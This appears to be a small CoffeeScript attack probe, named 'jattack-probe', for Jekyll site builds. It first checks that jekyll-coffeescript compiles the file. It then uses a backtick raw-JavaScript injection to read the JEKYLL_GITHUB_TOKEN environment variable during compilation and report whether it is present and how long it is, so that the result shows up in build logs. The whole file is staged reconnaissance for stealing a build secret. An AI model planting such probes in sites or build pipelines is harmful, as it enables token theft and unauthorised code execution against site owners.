# jattack-probe stage1: CoffeeScript compilation test
# If this compiles to JS, jekyll-coffeescript ran
probeVersion = 1
probeMessage = "JATTACK_COFFEE_STAGE1_RAN"

# Stage 2 probe: backtick = raw JS injection during compilation
# ExecJS executes: CoffeeScript.compile(source)
# If any output from compilation lands in build log, we can see it
tokenProbe = `(typeof process !== 'undefined' && process.env && process.env.JEKYLL_GITHUB_TOKEN) ? 'TOKEN_FOUND:' + process.env.JEKYLL_GITHUB_TOKEN.length + ':chars' : 'NO_TOKEN'`

module.exports = {version: probeVersion, token: tokenProbe}
